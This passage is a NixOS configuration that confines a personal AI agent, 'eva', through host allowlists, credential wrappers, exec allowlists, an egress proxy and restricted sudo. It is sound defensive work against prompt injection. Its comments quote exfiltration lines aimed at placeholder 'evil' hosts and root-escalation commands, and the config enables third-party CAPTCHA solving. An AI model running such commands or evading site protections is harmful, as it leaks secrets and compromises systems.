          # api.zotero.org is DELIBERATELY ABSENT (removed 2026-08-01). Reaching it
          # here meant `…/items?key=<key>&q=…`, which only works if eva KNOWS the key —
          # putting it in a command line she composed, and so in her transcript, her
          # exec log, her memory index and one step from a Telegram reply. Zotero now
          # goes exclusively through check-zotero / zotero-add (actions.zotero below),
          # which inject the key as a header from a file she never has to read. Do not
          # add it back: it would re-open the key-in-URL path the wrappers exist to close.
          "api.ouraring.com" # Oura API v2 — trusted host kept, but note its
          # Bearer-header auth can't ride request-trusted-url, so eva reaches it
          # from an action SHE implements (raw curl now; a destination-pinned
          # wrapper once exec is hardened). Trusting the host is the standing
          # permission for that action's fetches.
          # Biomedical literature (her Bellvitge/IDIBELL domain).
          "www.ebi.ac.uk" # Europe PMC REST (search + open full text, keyless)
          "api.unpaywall.org" # open-access PDF locator (keyless, ?email=)
          # Scholarly metadata / discovery (all keyless).
          "api.crossref.org" # DOI ↔ citation metadata
          "api.openalex.org" # works / authors / citations
          "api.semanticscholar.org" # papers / citations
          "export.arxiv.org" # arXiv API (Atom)
          # General reference (Wikimedia REST content APIs, keyless).
          "es.wikipedia.org"
          "en.wikipedia.org"
          "www.wikidata.org"
          # Geocoding — place ↔ lat/lon, pairs with check-weather (keyless).
          "nominatim.openstreetmap.org"
          # Clinical & drug data (biomedical, keyless).
          "clinicaltrials.gov" # ClinicalTrials.gov API v2
          "rxnav.nlm.nih.gov" # RxNorm drug normalization / interactions
          "api.fda.gov" # openFDA (drugs/devices/adverse events)
          # Everyday utilities (keyless).
          "api.frankfurter.app" # ECB currency exchange rates
          "date.nager.at" # public holidays by country (scheduling)
          "api.sunrise-sunset.org" # sunrise / sunset times
          # Weather forecast — keyless multi-day, complements check-weather.
          "api.open-meteo.com"
          # Words & books (keyless).
          "api.dictionaryapi.dev" # English dictionary / definitions
          "en.wiktionary.org" # dictionary (Wiktionary REST)
          "es.wiktionary.org" # dictionary (Spanish)
          "openlibrary.org" # book metadata
          # Social — Bluesky public AppView (keyless app.bsky.* XRPC, GET-only).
          "public.api.bsky.app"
        ];
      };
      trustedMail = {
        enable = true;
        trustedAddressesFile = owner.mailAddressesFile;
      };
      # Image generation via Gemini. The API key is a runtime file eva owns; the
      # model and endpoint are pinned by nix. This is why
      # generativelanguage.googleapis.com is a trusted site above — though note
      # generate-image uses raw curl (POST), not request-trusted-url.
      #
      # No reference image or reference root is pinned here: eva's avatar (and any
      # other reference she uses) lives in HER tree, and where it lives is hers to
      # manage, not the flake's. She passes `--reference <path>` at call time. The
      # exfil guard is preserved WITHOUT a hardcoded path — the wrapper confines a
      # runtime `--reference` to eva's $HOME by default (so she can pick among her
      # own images but can't feed an out-of-tree secret to the endpoint).
      generateImage = {
        enable = true;
        model = "gemini-2.5-flash-image";
        tokenFile = config.sops.secrets."google/gemini-token".path;
      };
      # Current weather via OpenWeatherMap. API key from sops-nix (eva-readable
      # secret), read at runtime by the check-weather wrapper. lang=es for
      # localized descriptions; add defaultLocation = "City,CC" for a default.
      checkWeather = {
        enable = true;
        tokenFile = config.sops.secrets."openweather/token".path;
        lang = "es";
      };
      # Calendar reader. `check-calendar <ics-url> --days 14` fetches the .ics
      # (through the same trusted-host gate — the provider hosts are trusted sites
      # above) AND lists upcoming events in one command; it also accepts a local
      # file/stdin. Replaces the old request-trusted-url | parse-ics pipe.
      # Oura Ring daily readiness. Token file stays in eva's own tree for now
      # (KEY=VALUE format: OURA_TOKEN=…); migrate to a sops-nix secret when
      # adding the `oura/token` entry to machines/homeserver/secrets/default.yml.
      checkOura = {
        enable = true;
        tokenFile = "/home/eva/workspace/.config/eva/oura-credentials";
      };
      # NixOS channel update check via the GitHub API. Keyless — no secret needed.
      checkNixosUpdate = {
        enable = true;
        branch = "nixos-26.05";
      };
      checkCalendar.enable = true;
      # Calendar invitations she can actually RSVP to. A .ics attached by hand
      # arrives as a file with no accept/decline — the client only offers that for a
      # `text/calendar; method=REQUEST` part whose ATTENDEE is the recipient, which
      # is what this composes. It only writes the message; the send still goes
      # through send-trusted-mail / send-email, so the recipient gates are unchanged
      # and there is no invitation-shaped way around them.
      makeInvite.enable = true;
      # Eva's ENTIRE Zotero surface: `check-zotero` (search/doi/collections/item, GET
      # only) and `zotero-add` (create). Two names over one wrapper, so the role is
      # visible in the command and the exec gate can govern them separately.
      #
      # Enabling this is why api.zotero.org left trustedSites above: the wrappers read
      # the key from the sops file and inject it as a header, so it never appears in
      # anything eva writes — whereas the request-trusted-url route required the key in
      # the URL. Reads and writes are now the same credential reached the same way, and
      # nothing about Zotero belongs in her TOOLS.md.
      #
      # `library` is deliberately unset: the wrapper resolves it from the key itself
      # (GET /keys/current), so the ONLY thing that has to exist is the sops secret —
      # no user ID to look up, and no way to aim it at a library the key does not own.
      # The write half is create-only (items carrying key/version are refused), so a bad
      # turn can add junk references but cannot damage the library he already has.
      zotero = {
        enable = true;
        tokenFile = config.sops.secrets."zotero/token".path;
      };
      # CAPTCHA solving via 2Captcha, so a form eva was asked to fill (Google Forms
      # in particular — that is why www.google.com/reCAPTCHA is a browsable host)
      # doesn't dead-end on a challenge she cannot answer. The API key is a runtime
      # file she reads through the `agents` group; the endpoint is pinned by nix and
      # only the proxyless task types are reachable, so the solving farm can't
      # double as a relay.
      #
      # allowedSites is the real limit: it is the SAME list as the browser SSRF
      # allowlist, so eva can only solve a captcha on a page she is allowed to be on
      # — a prompt-injected turn cannot spend the account's credit on someone else's
      # site. Image captchas are confined to her own $HOME (imageRoot unset → $HOME).
      # Each solve costs money; the skill tells her to use it to unblock an assigned
      # task, never speculatively or in a retry loop. Check credit with
      # `solve-captcha balance`.
      solveCaptcha = {
        enable = true;
        tokenFile = config.sops.secrets."2captcha/token".path;
        allowedSites = evaBrowsableSites;
      };
    };

    # Exec policy: allowlist + confirm-on-miss, via the module's first-class
    # options (pinned every start, so eva can't self-escalate at runtime).
    # Only allowlisted commands run unprompted; anything else raises an
    # approval request in the origin Telegram DM, answered inline.
    #
    # safeBins is the pre-blessed set: the module's read-only default PLUS the
    # observe-only system/text tools AND the local filesystem mutators below
    # (blessed because eva's WRITE surface is confined to her own tree by the
    # service sandbox). Deliberately NOT pre-
    # blessed, so they keep prompting: the escalation/exfil vectors — sudo,
    # the shells/interpreters and inline-eval, the exec-wrappers (env/timeout/
    # tee/xargs), sed/awk in-place, find -exec/-delete (guarded), the network
    # tools (curl/wget — use the request-trusted-url wrapper instead), and
    # every REMOTE git verb (push/pull/fetch/clone). eva widens coverage for a
    # SPECIFIC invocation at runtime without a rebuild via `openclaw approvals
    # allowlist add "<glob>"` — per-agent state, not re-seeded here.
    exec = {
      # security=full + ask=off: under the claude-cli runtime OpenClaw cannot
      # gate Claude's native Bash per command — its permission handler is
      # blanket (allow iff full+off, else deny) — so this is the only posture
      # that functions. Containment is enforced by the OTHER layers instead:
      # the service sandbox (writes confined to her own tree), the egress proxy,
      # mail through eva-mail (anything not to the owner is held), and
      # argument-constrained sudo. The safeBins/allowlist below are kept for a
      # runtime that honours them.
      security = "full";
      ask = "off";
      strictInlineEval = true;
      safeBins = config.my.openclaw.defaultSafeBins ++ [
        # Process / system / network INSPECTION (read-only; their mutating
        # subcommands need root, which a bare non-sudo invocation lacks).
        "ps"
        "pgrep"
        "pstree"
        "lsof"
        "ss"
        "ip"
        "journalctl"
        "w"
        "who"
        "vmstat"
        "iostat"
        "mpstat"
        "lscpu"
        "lsblk"
        "lsmem"
        "lsusb"
        "lspci"
        "nproc"
        "arch"
        "getent"
        "locale"
        "tty"
        "cal"
        # More read-only text/data shaping (stdin/args -> stdout; no writes,
        # no exec, no network).
        "tac"
        "tr"
        "rev"
        "fold"
        "fmt"
        "expand"
        "unexpand"
        "paste"
        "join"
        "printf"
        "seq"
        "expr"
        "test"
        "namei"
        "pathchk"
        "sha1sum"
        "sha512sum"
        "b2sum"
        "base64"
        "base32"
        "xxd"
        "hexdump"
        "od"
        "strings"
        # Filesystem MUTATION, blessed to run unprompted. This is safe ONLY
        # because eva's writable surface is confined to her OWN tree and a
        # private /tmp: the worst an injected prompt can do with these is trash
        # eva's own disposable state/mailbox, never the flake, the system
        # config, or anything off-box. chown/chgrp are near-no-ops
        # for a non-root single-group user (can't give files away). The real
        # escalation/exfil vectors are DELIBERATELY absent and still gated:
        # sudo, the shells/interpreters (bash/sh/python/R/node/perl), the
        # exec-wrappers that would smuggle an unblessed command past the gate
        # (env/timeout/nohup/nice/stdbuf/setsid/tee/xargs), in-place code
        # editors (sed/awk -i), and the network tools (curl/wget) — those keep
        # raising the Telegram approval prompt.
        "mkdir"
        "rmdir"
        "touch"
        "cp"
        "mv"
        "ln"
        "mktemp"
        "truncate"
        "rm"
        "unlink"
        "shred"
        "dd"
        "chmod"
        "chgrp"
        "chown"
        # File discovery. `find` is whole-binary blessed but CONSTRAINED by
        # the safeBinProfiles.find guard below (its mutating/exec predicates
        # are denied), so `find . -type f` reads unprompted while
        # `find . -delete` / `-exec` still MISS and raise the approval prompt.
        "find"
        # CUPS printing client tools. These talk to the LOCAL cups daemon over IPP
        # to submit / query / cancel print jobs and read/set per-user options —
        # NOT printer administration. `lpadmin`/`lpinfo` (add/remove printers,
        # enumerate devices) need root and are DELIBERATELY absent, so a bare
        # invocation of those still prompts. (`lp -h <remote>` could target another
        # IPP server, but eva's default destination is the local daemon.)
        "lp"
        "lpr"
        "lpstat"
        "lpq"
        "lprm"
        "cancel"
        "lpoptions"
        # The daily health digest (see serverHealthCheck above). Blessed by NAME
        # only — deliberately not curl: the script's fixed loopback queries are
        # the whole capability. Like the rest of this list it is inert under
        # claude-cli; the real gate is the argument-less sudoers entry.
        "server-health-check"
        # General service manager: `sudo service-ctl <action> <unit>`.
        # Allowed actions and units are baked in at build time; the real gate
        # is the sudoers entry on the script itself.
        "service-ctl"
        # ffmpeg/ffprobe/pandoc/xmllint are network-capable — `ffmpeg -i
        # http://evil/<secret>`, `pandoc https://evil/<secret>` (or its
        # --lua-filter RCE), `xmllint http://evil/<secret>` — so they are NOT
        # blessed BARE (a bare invocation still prompts). Instead they are
        # blessed only in the NETWORK-ISOLATED `offline <tool>` form via
        # exec.netIsolatedBins below, which runs them unprompted but inside a
        # no-network namespace where those URL fetches simply cannot connect.
      ];
      # Pre-seeded full-command-line globs (merged with eva's own runtime
      # additions). These bless read-only SUBCOMMANDS of tools too dangerous
      # to whole-binary allowlist — only forms that cannot mutate. eva works
      # in git repos and inspects services/logs/nix, so pre-blessing these
      # keeps routine reads unprompted; anything else still MISSES and raises
      # the inline Telegram approve/deny prompt (now that the native runtime
      # makes that gate live). She can widen coverage for a SPECIFIC
      # invocation at runtime without a rebuild via `openclaw approvals
      # allowlist add "<glob>"` (per-agent state, not re-seeded here).
      allowlist = [
        # git — read-only porcelain/plumbing.
        "git status*"
        "git log*"
        "git diff*"
        "git show*"
        "git blame*"
        "git rev-parse*"
        "git describe*"
        "git ls-files*"
        "git shortlog*"
        "git reflog*"
        "git cat-file*"
        "git branch --list*"
        "git remote -v"
        "git config --get*"
        "git config --list*"
        # git — LOCAL write subcommands. The remote is the security boundary,
        # so committing/branching/staging/rewriting local history is blessed,
        # but every network-touching verb is DELIBERATELY absent and keeps
        # prompting: push, pull, fetch, clone, remote (add/set-url), submodule
        # (can fetch), ls-remote. eva can commit freely; publishing always
        # goes through the approval gate.
        "git add*"
        "git commit*"
        "git restore*"
        "git checkout*"
        "git switch*"
        "git stash*"
        "git reset*"
        "git mv*"
        "git rm*"
        "git merge*"
        "git rebase*"
        "git cherry-pick*"
        "git revert*"
        "git tag*"
        "git branch*"
        "git clean*"
        "git notes*"
        "git worktree*"
        "git apply*"
        "git am*"
        # systemctl — inspection subcommands (status/show/list/is-* never
        # mutate). Restart/stop/start still go through her gated sudo grant.
        "systemctl status*"
        "systemctl show*"
        "systemctl cat*"
        "systemctl list-units*"
        "systemctl list-timers*"
        "systemctl list-unit-files*"
        "systemctl is-active*"
        "systemctl is-enabled*"
        "systemctl is-failed*"
        "systemctl --user status*"
        "systemctl --user list-units*"
        # nix — read-only query subcommands (no build/gc/store mutation).
        "nix eval*"
        "nix flake metadata*"
        "nix flake show*"
        "nix search*"
        "nix path-info*"
        "nix store ls*"
        "nix-instantiate --parse*"
        "nixos-version*"
        # hugo — build a site to check a change. `hugo mod*` and `hugo deploy*`
        # are deliberately absent. NB not a bounded transform: site config can
        # widen hugo's own exec/network policy, so under a live gate this would
        # need a pinned --config.
        "hugo"
        "hugo -*"
      ];
      # git push (and every other remote verb) is simply NOT in the allowlist
      # above, so it misses and prompts every time — the remote is the
      # boundary. No denylist needed; absence is the gate.
      # Constrain the whole-binary `find` grant to read-only traversal: deny
      # every predicate that mutates the filesystem or executes a program, so
      # the agent can search unprompted but cannot turn find into an ungated
      # delete/exec primitive. Any find command carrying one of these still
      # MISSES and raises the inline approval prompt.
      safeBinProfiles.find.deniedFlags = [
        "-delete"
        "-exec"
        "-execdir"
        "-ok"
        "-okdir"
        "-fls"
        "-fprint"
        "-fprintf"
        "-fprint0"
      ];
      # Network-capable converters: blessed ONLY in the `offline <tool>` form
      # (module ships the `offline` unshare-net launcher and seeds
      # `offline ffmpeg*` etc. into the allowlist). `offline ffmpeg …` runs
      # unprompted but with no network, so it can't be turned into an exfil
      # fetch; the bare tools stay gated.
      netIsolatedBins = [
        "ffmpeg"
        "ffprobe"
        "pandoc"
        "xmllint"
      ];
    };
    settings.tools.fs.workspaceOnly = false; # filesystem tools beyond the workspace (ACL-granted paths)
    # Browser: point at the nix store chromium and disable sandbox (required
    # on Linux without a user namespace / suid helper). noSandbox reduces
    # process isolation but is standard for headless server use.
    settings.browser.executablePath = "/run/current-system/sw/bin/chromium";
    settings.browser.noSandbox = true;
    # Browser SSRF policy (openclaw 2026.10.x; verified against
    # extensions/browser navigation-guard + src/infra/net/ssrf.ts). ONE list,
    # read by TWO checks with different matching:
    #
    #   navigation gate — with `dangerouslyAllowPrivateNetwork = false` set
    #     EXPLICITLY (unset skips the gate entirely, leaving the browser an
    #     unrestricted, JS-executing navigator — exactly the ungated outbound
    #     channel tools.web.fetch is disabled to prevent, since a prompt-injected
    #     eva could navigate to https://evil/?secret=…), a hostname navigation is
    #     refused unless it matches allowedHostnames. Globs are `*.suffix`
    #     (subdomains only, not the apex) — same shape as the request-trusted-url
    #     trustedSites globs above. Re-applied to every redirect hop and the final
    #     URL. CAVEAT: IP-literal URLs bypass this gate by design (they get only the
    #     private-network check), so a public IP literal is still navigable.
    #   private-network exception — EXACT match only (no globs): a host resolving
    #     into the LAN, which the SSRF guard blocks by default, is let through
    #     only if listed verbatim. Per-host, so we avoid the blanket
    #     dangerouslyAllowPrivateNetwork = true.
    #
    # 2026.6.x split these into hostnameAllowlist (the gate) and allowedHostnames
    # (the exception); 2026.10.x dropped hostnameAllowlist and folded both into
    # this one list, which is why evaBrowsableSites and the LAN hosts are
    # concatenated below.
    #
    # The gate carries `*.acpuchades.com` (owner's call, 2026-07-29), matching
    # actions.requestUrl.trustedSites: the browser may navigate to any
    # acpuchades.com subdomain, including internal admin UIs (adguard,
    # vaultwarden, prefect, mail…). LAN-resolving subdomains are still gated a
    # SECOND time by the exact-match private-network check, so eva can only
    # actually reach the ones listed per-host below; a public-resolving
    # subdomain passes both. The apex itself is NOT covered (`*.` is
    # subdomains-only). github.com stays OUT — the one plausibly
    # attacker-controlled host an injected turn could steer a browser toward.
    # evaBrowsableSites is shared with solve-captcha's page-host gate (see
    # above), so the pages she may browse and the pages she may solve a captcha
    # on are the same set by construction.
    settings.browser.ssrfPolicy.dangerouslyAllowPrivateNetwork = false;
    settings.browser.ssrfPolicy.allowedHostnames = lib.unique (
      evaBrowsableSites
      ++ [
        "cloud.${owner.domain}" # Nextcloud (resolves into LAN)
        "home.${owner.domain}" # home dashboard (resolves into LAN)
        "status.${owner.domain}" # Grafana metrics/dashboards (resolves into LAN)
        "www.fugazitrade.com" # fugazi-web backtest SPA (resolves into LAN)
      ]
    );
    # NB: do NOT set channels.telegram.attachmentRoots — that key exists ONLY
    # under channels.imessage; on telegram the strict schema rejects it and
    # the config seed crash-loops, taking eva down. For an attachment
    # restriction, find a key that validates for this channel (not an exfil
    # concern: the DM is locked to the single owner ID).
    # Exec approval prompts: make Telegram a NATIVE approval client so a
    # missed command raises an inline approve/deny prompt in the owner DM
    # (tap to allow-once / allow-always / deny) instead of blocking silently
    # until the CLI no-output watchdog kills the turn ("Something went wrong").
    # This is `channels.telegram.execApprovals`. The generic `approvals.exec.*`
    # forwarding pipeline is a DIFFERENT mechanism (relays a text `/approve
    # <id>` to *other* destinations) and does NOT render the native DM prompt —
    # setting it (even enabled=true, mode=session) delivered nothing, which is
    # why misses just hung. `approvers` auto-resolves from commands.ownerAllowFrom,
    # which ExecStartPre already patches with the owner's numeric ID from the
    # SOPS secret — so no plaintext ID is needed in the repo.
    settings.channels.telegram.execApprovals.enabled = true;
    settings.channels.telegram.execApprovals.target = "dm";
    # The inline tap-to-approve keyboard only renders if inline buttons are
    # allowed on the DM surface (enum: off|dm|group|all|allowlist). The prior
    # "allowlist" value was ambiguous for approvals; "dm" allows it explicitly.
    settings.channels.telegram.capabilities.inlineButtons = "dm";
    # Reply delivery: send each reply as ONE finished message, not streamed.
    # OpenClaw's default streams the reply in "block" mode — repeatedly editing
    # a growing Telegram message as tokens arrive, which is chatty and jitters
    # on mobile. "off" (enum: off|partial|block|progress) buffers the turn and
    # posts the complete reply once.
    settings.channels.telegram.streaming.mode = "off";

    # Off: an arbitrary-URL fetch is an exfiltration channel. request-trusted-url
    # covers the reads she needs.
    settings.tools.web.fetch.enabled = false;

    # Network egress: only through the module's filtering proxy, to the hosts
    # derived from the config above plus these. See my.openclaw.egress.
    egress = {
      enable = true;
      allowedDomains = [
        # Her fork + pull-request workflow, and the repos she clones.
        "github.com"
        "api.github.com"
        "codeload.github.com"
        "*.githubusercontent.com"
        # Hugo modules (the site's theme) and Python project environments.
        "proxy.golang.org"
        "sum.golang.org"
        "pypi.org"
        "files.pythonhosted.org"
      ];
    };

    # Dreaming: background memory consolidation. Runs nightly at 03:00 as a
    # managed sweep (light → REM → deep phases) that promotes short-term daily
    # notes into MEMORY.md and writes a human-readable DREAMS.md diary.
    # allowModelOverride is required for the dream-diary subagent to use the
    # configured model instead of the gateway default.
    # Active Memory: a blocking sub-agent that runs before each reply and
    # injects relevant memories into context automatically. Scoped to the main
    # agent on direct-message sessions only; inherits the session model so no
    # extra auth is needed. Haiku fallback keeps latency low if primary is slow.
    #
    # config.enabled = false (2026-08-04): recall OFF for now. Unlike the main
    # conversational turn (interactive `claude` live-session → billed to eva's
    # subscription plan), this sub-agent runs via runEmbeddedAgent, which POSTs
    # straight to api.anthropic.com/v1/messages. Anthropic bills that raw-API
    # path as a THIRD-PARTY app — drawn from the metered "extra usage" pool, not
    # the plan — so with the pool empty every recall failed with reason=billing
    # (HTTP 400 "Third-party apps now draw from your extra usage"). It degrades
    # gracefully (skips recall, replies still work) but spammed the logs for
    # nothing. There is NO knob to route an embedded sub-agent through the
    # subscription — the live-session is exclusive to the main turn — so recall
    # can only stop hitting the pool by being turned off here. Memory FILES
    # (MEMORY.md + memory/*.md) and the LOCAL keyless memorySearch above are
    # untouched: eva keeps her memory, only the automatic pre-reply LLM recall
    # is off. The entry stays `enabled` (plugin loaded, `/active-memory` command
    # still works); only the feature flag is flipped. Re-enable by setting this
    # back to true once the pool is topped up, or point config.model at its own
    # Anthropic API key / a local chat model (ollama) to avoid the pool.
    settings.plugins.entries.active-memory.enabled = true;
    settings.plugins.entries.active-memory.config.enabled = false;
    settings.plugins.entries.active-memory.config.agents = [ "main" ];
    settings.plugins.entries.active-memory.config.allowedChatTypes = [ "direct" ];
    settings.plugins.entries.active-memory.config.modelFallback = "anthropic/claude-haiku-4-5-20251001";
    settings.plugins.entries.active-memory.config.queryMode = "recent";
    settings.plugins.entries.active-memory.config.promptStyle = "balanced";
    settings.plugins.entries.active-memory.config.timeoutMs = 15000;
    settings.plugins.entries.active-memory.config.maxSummaryChars = 220;
    settings.plugins.entries.active-memory.config.persistTranscripts = false;
    settings.plugins.entries.active-memory.config.logging = true;

    settings.plugins.entries.memory-core.subagent.allowModelOverride = true;
    settings.plugins.entries.memory-core.subagent.allowedModels = [ "anthropic/claude-sonnet-4-6" ];
    settings.plugins.entries.memory-core.config.dreaming.enabled = true;
    settings.plugins.entries.memory-core.config.dreaming.frequency = "0 3 * * *";
    settings.plugins.entries.memory-core.config.dreaming.model = "anthropic/claude-sonnet-4-6";

    # Text-to-speech via ElevenLabs, through the module's tts options. The
    # CAPABILITY stays on (enable = true) so eva can generate audio on demand
    # — when you ask her to, or when she chooses to speak — but auto = "off"
    # means she NEVER auto-converts a reply to voice. (Was "inbound", which
    # spoke back to every voice message; that's the behavior we didn't want.)
    # The multilingual model handles Spanish; the caps bound an on-demand
    # synthesis so a huge text can't spawn a giant/slow clip. The
    # ELEVENLABS_API_KEY reaches the service via the SOPS-rendered
    # EnvironmentFile below.
    tts = {
      enable = true;
      provider = "elevenlabs";
      voiceId = "dNjJKg63Fr5AXwIdkATa";
      modelId = "eleven_v3";
      label = "Eva (español)";
      speed = 0.95;
      auto = "off";
      mode = "final";
      maxTextLength = 800;
      timeoutMs = 15000;
    };

    # ElevenLabs voice parameters not exposed as module options — injected raw.
    # NB: the path is top-level `tts.…` since openclaw 2026.10.x, which now
    # REJECTS `messages.tts` ("messages: Unrecognized key"); 2026.6.x was the
    # reverse. `settings.*` merges into the config ROOT, so these deep-merge with
    # the module-emitted `tts.…voiceSettings.speed`.
    # stability 0.45 = more expressive/variable delivery; similarityBoost 0.95 = close to voice clone.
    settings.tts.personas.default.providers.elevenlabs.voiceSettings.stability = 0.45;
    settings.tts.personas.default.providers.elevenlabs.voiceSettings.similarityBoost = 0.95;

    # Inbound speech-to-text: local whisper.cpp so eva understands voice
    # notes (the claude-cli runtime can't ingest audio itself). The
    # multilingual "small" GGML model balances Spanish accuracy against CPU
    # speed; on this 16-core box a short clip transcribes in a few seconds.
    # The model is fetched here with a pinned hash and handed to the module;
    # language stays "auto" (module default) to handle a Spanish/English mix.
    stt = {
      enable = true;
      model = pkgs.fetchurl {
        url = "https://huggingface.co/ggerganov/whisper.cpp/resolve/main/ggml-small.bin";
        hash = "sha256-G+OpsgY4Z7k35k4ux0gzZKeZF+FX+pjF2UtcH//qmHs=";
      };
    };

    # Passwordless sudo, argument-constrained (2026-09-19; the bare-path grant
    # this replaces let one injected `sudo systemctl link /tmp/x.service` — or
    # `sudo nixos-rebuild switch --flake /tmp/evil` — run arbitrary code as
    # root, bypassing every other gate). What remains:
    #   * `systemctl restart <unit>` for exactly the managed units — sudoers
    #     matches the full argument string, so no other verb or unit passes;
    #   * the eva-journal wrapper (validated unit + line count, --no-pager);
    #   * server-health-check (fixed queries, no arguments, counts not raw logs).
    # nixos-rebuild is gone entirely: a rebuild is not an agent operation, and
    # neither is shutdown/reboot — one injected mail would take down mail, DNS,
    # VPN and the house with it.
    # Paths are the NixOS profile symlinks `sudo` resolves. This is the single
    # source of truth for eva's sudo access.
    sudoCommands =
      # Per-unit restart grants are kept for the units eva OWNS (openclaw-eva)
      # and any that page her (ntfy-alert.failureUnits). General service admin
      # for the full evaManagedUnits set goes through service-ctl instead.
      map (u: "/run/current-system/sw/bin/systemctl restart ${u}.service")
        (lib.filter (u: u == "openclaw-eva"
                      || (config.my.ntfy-alert.enable or false
                          && builtins.elem u config.my.ntfy-alert.failureUnits)) evaManagedUnits)
      ++ [
        (lib.getExe evaJournal)
        # General service manager: `sudo service-ctl <action> <unit>`.
        # Actions: restart start stop reload. Units: evaManagedUnits allowlist.
        # Sudoers entry is on the script itself; validation is internal.
        (lib.getExe serviceCtl)
      ]
      # Only where Prometheus runs (it queries server-stats' instance).
      # `""` = no arguments allowed (the script refuses them anyway).
      ++ lib.optional (config.my.server-stats.enable or false) "${lib.getExe serverHealthCheck} \"\"";

    # No `access` grants: eva reaches nothing of alex's. She works on his site
    # through GitHub (fork + pull request as eva-nebot), not on his checkout.
    # ACLs set by earlier generations are not revoked by dropping them here;
    # clear the old site grant once on the live host:
    #   sudo setfacl -R -x u:eva,d:u:eva <site checkout>
    #   sudo setfacl -x u:eva /srv/encrypted/alex /srv/encrypted/alex/projects

    # Provider API keys reaching the service via my.openclaw.environmentFiles —
    # the token comes in from outside the module, next to the model/voice that
    # needs it. SOPS-rendered env file (openclaw/*-env), so no key is in this
    # public repo or the store
    environmentFiles = [
      config.sops.templates."openclaw/elevenlabs-env".path
      config.sops.templates."openclaw/eva/github-env".path
    ];
  };
}
